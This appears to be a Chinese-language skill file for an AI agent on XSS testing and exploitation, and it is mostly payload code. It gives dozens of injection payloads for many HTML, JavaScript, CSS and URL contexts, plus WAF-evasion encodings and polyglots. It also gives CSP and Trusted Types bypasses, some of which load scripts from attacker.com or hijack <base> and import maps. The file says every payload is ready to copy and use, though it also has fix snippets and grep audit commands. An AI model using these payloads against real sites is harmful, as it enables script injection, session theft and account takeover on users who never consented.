---
name: xss-testing
description: XSS跨站脚本深度测试与利用高级技能：反射/存储/DOM/mXSS/vXSS/Blind/Universal全类型、20+注入上下文矩阵、WAF深度绕过与Hackvertor编码矩阵、CSP高级绕过（script gadget/JSONP/strict-dynamic/Trusted Types对抗）、DOMPurify历史绕过谱系、现代框架（React/Vue/Angular/Svelte）危险Sink审计、DOM Clobbering与原型污染链式XSS、Service Worker持久化、XSS→CSRF→账户接管完整链、AI大模型辅助生成polyglot与盲打自动化、BeEF浏览器后渗透
version: 3.0.0
---

# XSS跨站脚本深度测试与利用技能（v3.0）

## 概述

XSS允许攻击者在受害者浏览器中执行任意JavaScript，是现代Web应用中最普遍也最容易被低估的高危漏洞。2025-2026年，XSS攻防已从"漏洞发现"转向"体系对抗"：CSP（Content-Security-Policy）、Trusted Types、Sanitizer API、框架自动编码、HttpOnly Cookie等多层防御日趋严格，但攻击者通过**mXSS新变体、DOMPurify历史绕过（CVE-2026-0540/2449/49459/66010）、script gadget链、Trusted Types策略滥用、原型污染链式利用、AI生成多态polyglot**等手法不断突破。同时，AI大模型（LLM）正把XSS从"手工绕过"推向"生成式对抗"——GenXSS实验证明GPT-4o生成的payload有80%可绕过ModSecurity默认规则集，XSSGAI基于14437条真实攻击样本训练出88%准确率的多态payload生成器。

本技能v3.0站在资深攻防专家视角，系统化覆盖**威胁建模→上下文注入→WAF绕过→CSP对抗→框架Sink审计→mXSS深度→原型污染链→持久化→账户接管链→AI辅助→后渗透**完整方法论，所有Payload可直接复制使用。

### 核心攻防认知
- **XSS本质是数据与代码的边界混淆**：用户输入被当作代码执行，浏览器无法区分可信代码与恶意代码
- **现代XSS主战场在客户端**：DOM型XSS已是2026年最常见的XSS变体，服务器与WAF完全不可见（payload只存在于URL fragment/postMessage/localStorage）
- **CSP不是万能药**：CSP主要防御脚本执行，不直接防御数据窃取；一旦脚本执行，payload即可在页面上下文中运行
- **缓解不等于修复**：WAF/XSS Filter/消毒器只是"缓解器"，绕过方式随解析器差异无穷无尽；正确修复是上下文感知输出编码+Trusted Types
- **AI让签名WAF失效**：多态payload数量无限，任何基于签名的WAF规则集都会被穷举绕过

### 现代防御体系与绕过路径总览
| 防御层 | 作用 | 攻击者的对应绕过 |
|-------|------|----------------|
| 输入过滤/WAF | 拦截危险字符/标签 | 编码变体、多态payload、HPP、解析器差异 |
| 输出编码 | 上下文感知转义 | 双重编码、mXSS突变、DOM sink绕过服务端 |
| 框架自动编码 | React/Vue等默认转义 | 危险的逃生舱口：dangerouslySetInnerHTML/v-html/{@html} |
| Sanitizer/DOMPurify | HTML消毒 | mXSS、命名空间混淆、DOM clobbering、原型污染（历史CVE谱系） |
| CSP | 限制脚本来源 | script gadget、JSONP端点、strict-dynamic滥用、'unsafe-inline'配置失误 |
| Trusted Types | 强制危险sink使用Trusted对象 | 宽松策略创建、策略名冲突、DOM clobbering |
| HttpOnly/SameSite | 保护Cookie | 不以Cookie为目标，改为ATO链/CSRF/密钥窃取 |
| 同源策略(SOP) | 隔离数据 | 0-click uXSS、浏览器漏洞、postMessage滥用 |

## 一、XSS完整攻击面与威胁建模

### 1.1 注入位置分类（20+上下文矩阵）
| 位置 | 上下文 | 测试方法 |
|------|-------|---------|
| HTML标签之间 | `<div>USERINPUT</div>` | `<script>alert(1)</script>` |
| HTML属性值 | `<input value="USERINPUT">` | `" onfocus=alert(1) autofocus x="` |
| HTML属性名 | `<div USERINPUT>` | `onmouseover=alert(1)` |
| HTML标签名 | `<USERINPUT href="/">` | `img src=x onerror=alert(1)` |
| JavaScript块 | `<script>var x="USERINPUT"</script>` | `";alert(1);//` |
| JS字符串（单引号/双引号/反引号）| 同上 | 对应闭合+payload |
| JS注释内 | `var x=/*USERINPUT*/` | `*/alert(1);/*` |
| JS模板字面量 | `` var x=`USERINPUT` `` | `${alert(1)}` |
| CSS样式 | `<style>body{color:USERINPUT}</style>` | `</style><script>alert(1)</script>` |
| CSS属性值 | `<div style="color:USERINPUT">` | `red;background:url(javascript:alert(1))` |
| URL属性（href/src/action）| `<a href="USERINPUT">` | `javascript:alert(1)` |
| JSON响应 | `{"name":"USERINPUT"}` | `"}</script><script>alert(1)</script>` |
| SVG/MathML | `<svg><script>alert(1)</script></svg>` | SVG命名空间不遵循HTML规则 |
| Markdown渲染 | 评论/文章渲染 | `[x](javascript:alert(1))`、`<img src=x onerror=alert(1)>` |
| 富文本编辑器 | UEditor/CKEditor/TinyMCE | 标签/事件白名单绕过 |
| POST/JSON参数 | API请求体 | JSON字段XSS、Content-Type变换 |
| URL Path | `/user/<USERINPUT>/profile` | 路径XSS、URL编码绕过 |
| Hash片段 | `#USERINPUT` | DOM XSS（不发往服务器，WAF不可见） |
| Cookie | Cookie值回显 | Cookie注入+XSS |
| Referer/User-Agent | 日志/统计页面UA回显 | 日志XSS/HTTP头注入 |
| 自定义HTTP头 | X-Forwarded-For等 | 头注入XSS |
| iframe srcdoc | `<iframe srcdoc="USERINPUT">` | srcdoc注入 |
| WebSocket消息 | 前端实时渲染 | 消息内容XSS（绕过HTTP层防御） |
| SVG文件上传 | 头像/签名/表情 | SVG内嵌script/XSS，二次加载 |
| PDF生成 | 报表/导出功能 | PDF内HTML注入，浏览器打开执行JS |
| 日志查看器 | 管理后台日志回显 | Blind XSS → 管理员会话 |

### 1.2 XSS类型扩展
- **反射型XSS（Reflected）**：URL参数即时回显，一次性，需社工诱导点击
- **存储型XSS（Stored/Persistent）**：恶意代码存入数据库/文件，影响所有访问用户，危害最大
- **DOM型XSS**：前端JS直接操作DOM引入（不经过服务器，WAF/服务端防护全部失效）
- **mXSS（突变XSS）**：浏览器对innerHTML解析后发生突变，是Sanitizer绕过的核心武器
- **vXSS（VBScript XSS）**：IE兼容模式VBScript执行
- **Universal XSS（uXSS）**：浏览器/插件漏洞导致跨源，0-click
- **Self-XSS**：需诱导用户自己输入，结合CSRF组合升级为ATO
- **Blind XSS（盲打XSS）**：在后台管理页/日志/工单系统中触发（无回显），配合xss.ht等平台自动化
- **PDF XSS**：PDF生成中的XSS，浏览器打开执行JS
- **Flash XSS**：ActionScript中的XSS（老版本）
- **PostMessage XSS**：不安全的postMessage监听
- **WebWorker XSS**：Worker中执行脚本绕过CSP
- **Service Worker XSS**：注册恶意Service Worker持久化，跨页面劫持
- **模板注入XSS（CSTI）**：客户端模板引擎（Angular/Vue/Mustache）表达式执行
- **原型污染→XSS**：通过`__proto__`污染对象属性，改变库的预期行为触发sink
- **DOM Clobbering XSS**：利用HTML元素name/id覆盖DOM属性，劫持应用逻辑

### 1.3 威胁建模优先级
1. 优先审计**存储型+DOM型组合**（管理后台+富文本渲染）——影响面最大
2. 优先审计**登录态上下文**（密码修改、支付、设置页）——可直接升级为ATO
3. 优先审计**日志/工单/客服系统**——Blind XSS打管理员
4. 其次：反射型（需要诱导）、Self-XSS（需链式）、uXSS（浏览器0day）

## 二、上下文感知Payload生成

### 2.1 HTML标签之间（无过滤）
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen autofocus onfocus=alert(1)>
<iframe onload=alert(1) src=x>
<embed src=x onerror=alert(1)>
<object data=x onerror=alert(1)>
<bgsound src=x onerror=alert(1)>
<link rel=import href=data:text/html,<script>alert(1)</script>>
<form action=javascript:alert(1)><input type=submit>
<isindex action=javascript:alert(1) type=image>
```

### 2.2 HTML属性值中（双引号包裹）
```html
" onmouseover=alert(1) x="
" onfocus=alert(1) autofocus x="
" onload=alert(1) x="
" onerror=alert(1) x="
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
" autofocus onfocus=alert(1) x="
" onpointerenter=alert(1) x="
" onanimationstart=alert(1) x="
```

### 2.3 HTML属性值中（单引号包裹）
```html
' onmouseover=alert(1) x='
'><script>alert(1)</script>
' onfocus=alert(1) autofocus x='
' onerror=alert(1) x='
```

### 2.4 无引号属性值
```html
 onmouseover=alert(1)
 onfocus=alert(1) autofocus
 onerror=alert(1)
 =alert(1)     （某些解析器允许属性值不带等号值）
```

### 2.5 JavaScript字符串中
```javascript
// 双引号字符串
";alert(1);//
";alert(1);"
";new Function`al\ert\`1\``//
";(alert)(1);//

// 单引号字符串
';alert(1);//
';alert(1);'

// 反引号模板字符串
`;alert(1);//
${alert(1)}    （ES6模板字符串注入）
`${alert(1)}`

// 括号内
x=new Function`al\ert\`1\``;
x=eval('ale'+'rt(1)');
setTimeout`al\ert\`1\``;
setInterval`al\ert\`1\``;
Function`al\ert\`1\```();

// JS行内事件处理器（不需要分号，自动分号插入ASI）
<img src=x onerror=alert(1)>
<a href="javascript:void(0)" onclick=alert(1)>click</a>
```

### 2.6 URL属性（javascript:/data:协议）
```html
<a href="javascript:alert(1)">click</a>
<a href="javascript:%61%6c%65%72%74%28%31%29">click</a>     (URL编码)
<a href="data:text/html,<script>alert(1)</script>">click</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
<iframe src="javascript:alert(1)">
<iframe src="data:text/html,<script>alert(1)</script>">
<embed src="javascript:alert(1)">
<object data="javascript:alert(1)">
<form action="javascript:alert(1)"><button>go</button></form>
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

### 2.7 CSS上下文中注入
```html
</style><script>alert(1)</script>
<style>@keyframes x{}b{animation:x onstart;}</style>
<style>*[x{}]{background:url(javascript:alert(1))}</style>
<div style="color:red;background:url(javascript:alert(1))">
<div style="background-image:url(javascript:alert(1))">
<div style="width:expression(alert(1))">     (IE only)
<style>body{background:url(javascript:alert(1))}</style>
<link rel=stylesheet href=data:,*%7bx:expression(alert(1))%7d>
```

### 2.8 DOM XSS Source-Sink映射
```javascript
// Sources（可被用户控制的输入点）
location.href / location.search / location.hash / location.pathname
document.URL / document.documentURI / document.baseURI / document.referrer
window.name
postMessage data（需验证origin）
localStorage/sessionStorage/indexedDB（二次存储源）
document.cookie
AJAX/JSONP回调数据
WebSocket消息 / Server-Sent Events
Workbox缓存响应 / 第三方CDN JSON

// Sinks（危险输出点）
innerHTML / outerHTML / document.write() / document.writeln()
eval() / setTimeout() / setInterval() / new Function()
location / location.href / window.open()
element.src / element.href / element.action
element.setAttribute()（动态属性名/值）
jQuery: .html() / .append() / .prepend() / .after() / .before() / $(userInput)
Angular: [innerHTML] / {{expression}} / $eval() / bypassSecurityTrustAs*
Vue: v-html / {{mustache}} / 动态组件
React: dangerouslySetInnerHTML / href={userInput}
Svelte: {@html}

// DOM XSS示例
// URL: #<img src=x onerror=alert(1)>
document.getElementById('x').innerHTML = location.hash.slice(1);
// URL: ?q=<svg onload=alert(1)>
$('div').html(getParameter('q'));
```

### 2.9 Polyglot XSS（跨上下文万能Payload）
```javascript
// 同时兼容HTML属性/HTML内容/JS字符串/URL上下文的Polyglot
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

// 多语言Polyglot（HTML/JS/SQL/命令注入）
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/<script>alert(1)</script>;--

// HTML+JS+URL polyglot
";alert(1);"<!--<script>alert(1)</script>-->
```

## 三、WAF深度绕过与Hackvertor编码矩阵

### 3.1 标签/事件大小写与变体
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=X ONERROR=alert(1)>
<svg oNloAd=alert(1)>
<ScRiPt sRc=x></ScRiPt>
```

### 3.2 标签内填充垃圾
```html
<img/****/src=x/****/onerror=alert(1)>
<img src=x onerror=alert(1)//////>
<img src=x onooooooooonerror=alert(1)>    (不可识别属性+事件)
<IMG SRC=xonerror=alert(1)>    (缺少空格，某些解析器识别)
<img/src=x onerror=alert(1)>
<img
src=x onerror=alert(1)>       (换行分隔)
<img%09src=x%09onerror=alert(1)>    (Tab)
<img%0asrc=x%0donerror=alert(1)>    (换行符)
```

### 3.3 事件处理程序变形
```html
<!-- 标准事件 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- 自动触发事件 -->
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- 少见事件（绕过WAF黑名单）-->
<svg onload=alert(1)>                    (SVG命名空间专属事件)
<animate onbegin=alert(1) attributeName=x dur=1s>
<set onbegin=alert(1) attributeName=x to=1 dur=1s>
<svg><animate onend=alert(1) attributeName=x dur=1s>
<body onpointerdown=alert(1)>
<div onwheel=alert(1)>
<details ontoggle=alert(1)>
<input oninput=alert(1)>
<object onerror=alert(1)>
<applet code=xxx onerror=alert(1)>
<vmlframe xmlns=vml onload=alert(1)>

<!-- 事件名变形 -->
<svg/onload=alert(1)>
<svg///onload=alert(1)>
<svg onload%09=alert(1)>
<svg onload%0a=alert(1)>
<svg ONLOAD=alert(1)>

<!-- 事件处理器换行 -->
<img src=x onerror
=alert(1)>
<img src=x onerror=&#10;alert(1)>
```

### 3.4 JavaScript字符串/函数混淆
```javascript
// 字符串拆分
<script>eval('al'+'ert(1)')</script>
<script>eval('al\x65rt(1)')</script>
<script>eval('al\u0065rt(1)')</script>
<script>eval('\141\154\145\162\164(1)')</script>     (八进制)
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>eval(atob('YWxlcnQoMSk='))</script>

// 函数调用变形
<script>window['alert'](1)</script>
<script>top['alert'](1)</script>
<script>self['alert'](1)</script>
<script>parent['alert'](1)</script>
<script>this['alert'](1)</script>
<script>globalThis['alert'](1)</script>
<script>[].filter.constructor('alert(1)')()</script>
<script>alert.call(null,1)</script>
<script>alert.apply(null,[1])</script>
<script>new (alert)(1)</script>
<script>(alert)(1)</script>
<script>({valueOf:alert})</script>
<script>Function('al'+'ert(1)')()</script>
<script>[].sort.constructor('alert(1)')()</script>

// 利用JS特性绕过括号过滤
<script>alert`1`</script>            (标签模板字符串)
<script>eval`al\ert\`1\``</script>
<script>setTimeout`alert\`1\``</script>
<script>Function`al\ert\`1\```()</script>
<script>location='javascript:alert\x281\x29'</script>

// 正则表达式
<script>location='javascript:/alert(1)/.source'</script>
```

### 3.5 编码绕过
**HTML实体编码（在HTML属性/文本中生效）：**
```html
<!-- 命名实体 -->
&lt;img src=x onerror=alert(1)&gt;

<!-- 十进制实体 -->
<img src=x onerror=&#97;lert(1)>
&#60;img src=x onerror=alert(1)&#62;

<!-- 十六进制实体 -->
<img src=x onerror=&#x61;lert(1)>
&#x3c;img src=x onerror=alert(1)&#x3e;

<!-- 属性中实体编码（on事件内） -->
<a href="&#106;avascript:alert(1)">click</a>
<img src=x onerror="&#97;lert(1)">
```

**Unicode编码：**
```html
<a href="&#x006A;avascript:alert(1)">click</a>
<iframe src="javascript:\u0061lert(1)">
<script>\u0061lert(1)</script>
```

**URL编码：**
```html
<a href="javascript:%61%6c%65%72%74%28%31%29">click</a>
<img src=x onerror="%61%6c%65%72%74%28%31%29">
```

**多重编码：**
```
%253Cimg%2520src=x%2520onerror=alert(1)%253E     （双重URL编码）
```

**UTF-7编码（IE/老浏览器）：**
```html
+ADw-img src=+ACI-x+ACI- onerror=+ACI-alert(1)+ACI-+AD4-
```

### 3.6 Hackvertor编码矩阵（Burp插件实战）
Hackvertor将编码变换封装为可嵌套标签，核心标签与适用场景：

| Hackvertor标签 | 编码内容 | 适用绕过场景 |
|---------------|---------|-------------|
| `&#x6f;` / `&#111;` | 十六进制/十进制HTML实体 | 属性内on事件、`<a href>`协议混淆 |
| `\u006f` | Unicode转义 | JS字符串上下文 |
| `%6f` | URL编码 | href/src属性、路径注入 |
| `\x6f` | 十六进制转义 | JS字符串 |
| `\141` | 八进制转义 | JS字符串 |
| `\u{d}` | Unicode码点（ES6） | 现代浏览器JS |
| `atob('...')` | Base64 | eval/Function参数 |
| `String.fromCharCode()` | 数字→字符 | 无引号上下文 |
| `\u{74}\u{65}\u{78}\u{74}` 拆分 | 字符级拆分 | 关键字黑名单 |
| 全角字符 | 全角统一 | 归一化不完整的过滤器 |

**嵌套组合示例（Burp Hackvertor语法）：**
```html
<!-- 双层编码：URL编码套HTML实体 -->
<svg onload=&#x61;<@%6c%65%72%74(1)>>  （构造 alert(1) 的混合编码）

<!-- Hackvertor标签组合（Burp内直接使用） -->
<img src=x onerror="&#97;<@\u006c>ert(1)">
```

### 3.7 利用HTML解析器特性
```html
<!-- 无引号属性自动结束 -->
<img src=x onerror=alert(1) <b>
<a href=javascript:alert(1)>click</a>
<a href=javascript:alert(1) id=x>click</a>

<!-- 斜杠代替空格 -->
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>

<!-- 空字节（老IE）-->
<img src=x onerror=%00alert(1)>

<!-- 全角字符（某些过滤器未归一化）-->
<IMG SRC=X ONERROR=ａｌｅｒｔ（１）>   (全角括号/字符，部分浏览器识别)

<!-- Null字符截断 -->
<scr\0ipt>alert(1)</scr\0ipt>
```

### 3.8 SVG/MathML特殊命名空间
```html
<!-- SVG中script不需要严格闭合 -->
<svg><script>alert(1)</script></svg>
<svg><script>alert(1)<!-- （自动闭合）-->

<!-- SVG中可执行脚本变体 -->
<svg onload=alert(1)>
<svg><g onload=alert(1)>
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=javascript:alert(1)><rect width=100 height=100 /></a></svg>

<!-- SVG foreignObject嵌入HTML -->
<svg><foreignObject width=100 height=100><body xmlns=http://www.w3.org/1999/xhtml onclick=alert(1)></body></foreignObject></svg>

<!-- XML命名空间（.xht/.xml文件或XHTML）-->
<xml:script xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></xml:script>
```

### 3.9 Markdown/XSS组合
```markdown
![x](javascript:alert(1))
[x](javascript:alert(1))
[x](data:text/html,<script>alert(1)</script>)
[a](javascript:alert(1) "title")
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### 3.10 HTTP协议层绕过（WAF盲区）
- **Content-Type混淆**：`application/json` / `text/plain` / `application/x-www-form-urlencoded` 切换，部分WAF只解析特定类型
- **HPP（HTTP参数污染）**：`?a=1&a=<script>...` 或 JSON body + URL参数拆分payload
- **分块传输（Chunked）**：`Transfer-Encoding: chunked` 分段，部分WAF不重组
- **HTTPS/Gzip/自定义加密**：避免明文检测
- **multipart/form-data包裹**：部分WAF不解析multipart中的JSON/表单
- **Unicode 归一化攻击（2025新兴）**：利用 NFC/NFKC 归一化差异，发送全角/组合字符变体，过滤器与解析器归一化不一致导致漏检

## 四、CSP高级绕过（script gadget/JSONP/strict-dynamic/Trusted Types对抗）

### 4.1 CSP指令检测与分析
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```
关键指令：`script-src`、`object-src`、`base-uri`、`style-src`、`img-src`、`frame-src`、`connect-src`、`report-uri`、`require-trusted-types-for`、`trusted-types`
**审计要点：**
- `script-src` 是否含 `'unsafe-inline'` / `'unsafe-eval'` / `'strict-dynamic'` / `data:` / 通配符域名
- `base-uri` 缺失 → 可通过 `<base>` 标签劫持相对路径脚本加载
- `object-src` 缺失 → `<object>/<embed>` 加载恶意插件/HTML
- `trusted-types` 策略名是否可预测（可通过DOM clobbering或宽松策略绕过）

### 4.2 常见unsafe-inline/dynamic绕过
```javascript
// unsafe-inline允许的场景
<script>alert(1)</script>   // script-src含'unsafe-inline'

// unsafe-eval
eval('alert(1)')
new Function('alert(1)')()
setTimeout('alert(1)',0)
setInterval('alert(1)',0)

// strict-dynamic绕过（允许script标签中动态创建的脚本加载）
// 只要有合法脚本执行，即可用createElement动态加载任意脚本
<script src=//attacker.com/x.js></script>
```

### 4.3 JSONP端点绕过CSP
```javascript
// 若script-src为'self'，寻找同源JSONP端点
<script src="/api/jsonp?callback=alert"></script>
// 典型JSONP可利用端点
<script src="https://target.com/xxx?callback=alert"></script>
// 利用JSONP反射XSS
<script src="/jsonp?cb=%3C/script%3E%3Csvg%20onload=alert(1)%3E"></script>

// 知名站点JSONP端点
// 用于script-src白名单包含这些CDN/站点时
<script src="https://www.google.com/jsapi?callback=alert"></script>
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert"></script>
<script src="https://www.youtube.com/oembed?url=x&callback=alert"></script>
```

### 4.4 Script Gadget链（2026年主流CSP绕过）
**核心概念**：利用页面已存在的合法JS库/代码片段作为"gadget"，注入看似无害的HTML元素触发库代码将属性值转化为可执行代码。Google CCS论文实测：16个主流框架中13个可绕过strict-dynamic CSP，DOMPurify/Closure等消毒器同样被绕过。

```javascript
// jQuery data-text gadget（经典）
// 注入无害HTML，jQuery库自动将其data-text属性值渲染为HTML
<div data-role="button" data-text="<img src=x onerror=alert(1)>"></div>
<script>var buttons = $("[data-role=button]"); buttons.html(button.getAttribute("data-text"));</script>

// Angular表达式gadget（配合注入的class/属性）
<div ng-app ng-csp><div ng-bind="constructor.constructor('alert(1)')()"></div></div>

// Vue数据绑定gadget
<div id=x v-html="'<img src=x onerror=alert(1)>'"></div>

// 通用gadget审计思路：
// 1. 枚举页面加载的JS库与版本
// 2. 查找读取DOM属性/选择器的代码（data-*、class、id选择器）
// 3. 注入无害标记匹配gadget选择器
// 4. 验证属性值是否被写入HTML sink

// 利用polyfill/第三方库
<script src=/js/angular.js></script>  // 配合Angular模板注入
<script src=https://cdn.jsdelivr.net/npm/lodash@4.17.15/lodash.min.js></script>
```

### 4.5 Trusted Types对抗（2026实战）
Trusted Types要求innerHTML/script.src等危险sink必须传入TrustedHTML/TrustedScriptURL对象。绕过路径：

```javascript
// 路径1：策略创建/滥用（MutantBedrog恶意广告实战手法）
// 若站点允许创建任意策略名，直接创建透传策略
if (typeof trustedTypes !== 'undefined') {
  const p = trustedTypes.createPolicy('rp', { createHTML: (input) => input });
  const d = document.createElement('iframe');
  d.setAttribute('srcdoc', p.createHTML('<script>alert(1)<\/script>'));
  document.body.appendChild(d);
}

// 路径2：createScriptURL透传 + 动态script
trustedTypes.createPolicy('my', { createScriptURL: (input) => input });
var s = document.createElement('script');
s.src = trustedTypes.getPolicy('my').createScriptURL('https://attacker.com/x.js');
document.head.appendChild(s);

// 路径3：策略名碰撞/预定义策略劫持
// 若默认策略已存在且宽松（createHTML: s=>s），直接使用
trustedTypes.defaultPolicy.createHTML('<img src=x onerror=alert(1)>')

// 路径4：DOM clobbering削弱TT检查（CVE-2026-49459同源思路）
// 通过注入的form/name属性覆盖库内部检查引用的属性

// 路径5：绕过TT覆盖的sink
// TT默认只覆盖innerHTML/outerHTML/write/srcdoc/src属性
// location.href、eval、setTimeout(string)等可能未纳入require-trusted-types-for
// 若script-src允许'unsafe-eval'，eval('alert(1)')直接执行

// 检测TT是否生效
if (window.trustedTypes && trustedTypes.createPolicy) { console.log('TT available'); }
```

### 4.6 利用允许的资源加载
```javascript
// 若script-src允许data:
<script src=data:text/javascript,alert(1)></script>
<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>

// 若script-src允许非安全URL scheme
<script src=javascript:alert(1)></script>

// 若允许unsafe-hashes/nonce/base64
// 需获取nonce值，DOM XSS场景下可读取nonce属性
<script nonce="abc123">alert(1)</script>
```

### 4.7 浏览器缓存/重定向绕过
```javascript
// 利用<meta>刷新
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">

// 利用<link rel=preload/as=script>预加载后执行
<link rel=preload as=script href=data:,alert(1)>

// base-uri缺失 → 劫持相对路径资源
<base href="https://attacker.com/">
```

### 4.8 新兴CSP绕过面（2025-2026）
- **Import Maps利用**：页面使用`<script type="importmap">`时，注入`"imports": {"vue": "https://attacker.com/vue.js"}`将合法模块导入重定向至恶意URL
- **WASM绕过**：WebAssembly不受script-src内联限制的部分场景，`<script type="module">`+WASM加载
- **CSS注入→XSS**：CSS `@import`/`url()` 联合 `-moz-binding`（老Firefox）或 CSS `expression()`（老IE）；现代浏览器CSS注入主要配合数据窃取（CSS选择器属性值嗅探）
- **Service Worker注册**（需允许的来源）：`navigator.serviceWorker.register('/sw.js')` 后SW缓存/拦截全部请求

### 4.9 CSP绕过辅助工具
- https://csp-evaluator.withgoogle.com/  （CSP策略评估，Google官方）
- https://cspbypass.com/  （CSP绕过payload库）
- Burp CSP Auditor插件
- https://github.com/yetingli/SecLists（CSP绕过wordlist）
- **csp-collector**：收集CSP report endpoint数据

## 五、现代框架XSS与危险Sink审计

### 5.1 框架默认防护与逃生舱口
现代框架默认自动编码，XSS几乎只发生在"逃生舱口"（raw HTML插入API）——**审计时不用扫描所有插值，直接grep危险API即可**：

| 框架 | 默认防护 | 逃生舱口（危险Sink） |
|------|---------|---------------------|
| React | JSX自动转义所有插值 | `dangerouslySetInnerHTML`、`href={userInput}`(javascript:)、`React.createElement`动态标签名 |
| Vue | `{{ }}`自动转义 | `v-html`、动态组件`<component :is>`、`template`字符串编译、`$eval` |
| Angular | 插值与属性绑定自动消毒 | `bypassSecurityTrustAs*`系列、`[innerHTML]`、动态组件工厂 |
| Svelte | `{expr}`自动转义 | `{@html}`、动态组件 |
| AngularJS(1.x) | 沙箱（已废弃） | 模板表达式沙箱逃逸（见5.4） |

**grep审计命令（代码审计核心动作）：**
```bash
# React/Vue/Angular/Svelte 危险Sink全局搜索
rg -n "dangerouslySetInnerHTML|v-html|{@html}|bypassSecurityTrust|\[innerHTML\]|innerHTML\s*=|outerHTML\s*=|document\.write|eval\(|new Function|setTimeout\(['\"]|location\.(href|assign|replace)\s*=" src/ --type ts --type js
# 动态URL属性
rg -n "href=\{|\:href=|v-bind:href|target=\"_blank\".*href"
# 动态属性名/事件
rg -n "setAttribute\(|addEventListener\(.*user|\[[A-Za-z]+\]" src/
```

### 5.2 React危险模式
```jsx
// 危险：用户可控HTML直接渲染
<div dangerouslySetInnerHTML={{ __html: userInput }} />
// 修复：先DOMPurify再渲染
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />

// 危险：javascript: URL（React不会阻止href协议）
<a href={userInput}>link</a>
// 修复：协议白名单校验
function safeUrl(u){ return /^(https?:|mailto:|#)/.test(u) ? u : '#'; }

// 危险：动态标签名（React.createElement(userTag)）
React.createElement(userControlledTag, {...})

// 危险：SSR/Next.js hydration JSON注入
// RSC/SSR将initial state序列化为内联<script>，若JSON未转义</script>即可逃逸
// 检测：页面源码中搜"self.__next_f"或__NEXT_DATA__的<script>包裹内容
// payload思路：值中注入 "</script><script>alert(1)</script>"
```

### 5.3 Vue危险模式
```vue
<!-- 危险：v-html直接渲染 -->
<div v-html="userHtml"></div>

<!-- 危险：用户可控模板编译（等于任意代码执行） -->
new Vue({ el: '#app', template: '<div>' + userProvidedString + '</div>' })  // NEVER DO THIS

<!-- 危险：动态组件名 -->
<component :is="userControlledName"></component>

<!-- 已知漏洞：CVE-2024-6783 Vue 2模板编译器特定指令模式XSS -->
<!-- Vue 2已EOL，建议审计时标注迁移Vue 3 -->

<!-- URL属性 -->
<a v-bind:href="userUrl">link</a>
```

### 5.4 Angular/AngularJS危险模式
```typescript
// Angular(2+) 危险：绕过安全管道
this.sanitizer.bypassSecurityTrustHtml(userHtml);       // [innerHTML]配合
this.sanitizer.bypassSecurityTrustScript(userScript);
this.sanitizer.bypassSecurityTrustUrl(userUrl);
this.sanitizer.bypassSecurityTrustResourceUrl(userUrl); // iframe src

// Angular 1.x 沙箱逃逸（经典payload，按版本选择）
{{constructor.constructor('alert(1)')()}}
{{_l.constructor.prototype.valueOf=1,toString=1}}
{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}
{{$on.constructor('alert(1)')()}}
{{[].pop.constructor('alert(1)')()}}
// SVG变体（{{ }}被过滤时）
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

### 5.5 Svelte危险模式
```svelte
<!-- 危险：{@html}直接渲染用户HTML -->
<div>{@html userHtml}</div>
<!-- 修复：DOMPurify.sanitize后再渲染 -->
<div>{@html DOMPurify.sanitize(userHtml)}</div>
```

### 5.6 客户端模板注入（CSTI）与通用检测
**CSTI检测payload（在插值位置输入）：**
```
{{7*7}}
${7*7}
<%= 7*7 %>
{{constructor.constructor('alert(1)')()}}
```
**验证链**：`{{7*7}}`返回49 → 模板引擎表达式执行 → 尝试`constructor.constructor`构造器链 → 任意代码执行。

**框架版本指纹→已知漏洞匹配：**
| 框架/库 | 已知漏洞 | 检测特征 |
|---------|---------|---------|
| AngularJS 1.x | 沙箱逃逸（多版本CVE） | `ng-app` + `{{...}}` |
| Vue 2 | CVE-2024-6783（模板指令XSS） | `v-bind` 特定模式 |
| jQuery <3.5 | CVE-2020-11022/11023（htmlPrefilter） | `$(userHtml)` / `.html()` |
| Bootstrap 3 | CVE-2025-1647（DOM clobbering XSS） | data-toggle/自定义事件 |
| DOMPurify <3.4.x | 2024-2026 mXSS系列（见第七章） | innerHTML渲染用户内容 |

### 5.7 框架XSS审计方法论（实战步骤）
1. **识别框架版本**：`package.json`/`manifest`/JS特征（React 17+无`React.createElement`痕迹，Vue挂载点`#app`）
2. **grep逃生舱口API**（见5.1命令），逐一审查数据流
3. **追踪source→sink**：URL参数/hash/postMessage → 状态管理（Redux/Pinia）→ 渲染
4. **检查SSR/Hydration边界**：序列化JSON的`</script>`逃逸、hydration不匹配导致的DOM重解析
